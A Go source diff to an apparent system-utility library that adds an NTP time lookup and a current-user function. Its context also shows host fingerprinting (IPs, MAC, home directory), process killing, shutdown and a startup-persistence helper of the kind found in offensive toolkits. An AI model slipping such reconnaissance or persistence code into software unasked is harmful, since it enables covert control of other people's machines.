@@ -6,8 +6,11 @@ import (
 	"io/fs"
 	"log"
 	"os"
+	"os/user"
 	"strings"
+	"time"
 
+	"github.com/beevik/ntp"
 	"github.com/matishsiao/goInfo"
 	"github.com/mitchellh/go-homedir"
 	ps "github.com/mitchellh/go-ps"
@@ -25,7 +28,7 @@ func Info() map[string]string {
 
 	i, _ := goInfo.GetInfo()
 
-	u = info()
+	u = userinfo()
 	ap_ip = ""
 	_ = ap_ip
 	hdir, err := homedir.Dir()
@@ -42,14 +45,23 @@ func Info() map[string]string {
 		"cpu_num":   fmt.Sprintf("%v", i.CPUs),
 		"kernel":    fmt.Sprintf("%v", i.Kernel),
 		"core":      fmt.Sprintf("%v", i.Core),
-		"local_ip":  GetLocalIp(),
-		"global_ip": GetGlobalIp(),
+		"local_ip":  GetLocalIP(),
+		"global_ip": GetGlobalIP(),
 		"ap_ip":     GetGatewayIP(),
 		"mac":       mac,
 		"homedir":   hdir,
 	}
 
 	return inf
+}
+
+// Obtains current time from NTP server
+func TimeNTP() time.Time {
+	ntp_time, err := ntp.Time("time.ntp.com")
+	if err != nil {
+		ntp_time, _ = ntp.Time("time.apple.com")
+	}
+	return ntp_time
 }
 
 // PkillPid kills a process by its PID.
@@ -191,4 +203,9 @@ func Shutdown() error {
 // AddPersistentCommand creates a task that runs a given command on startup.
 func AddPersistentCommand(cmd string) error {
 	return addPersistentCommand(cmd)
+}
+
+func GetUser() (string, error) {
+	current_user, err := user.Current()
+	return current_user.Username, err
 }
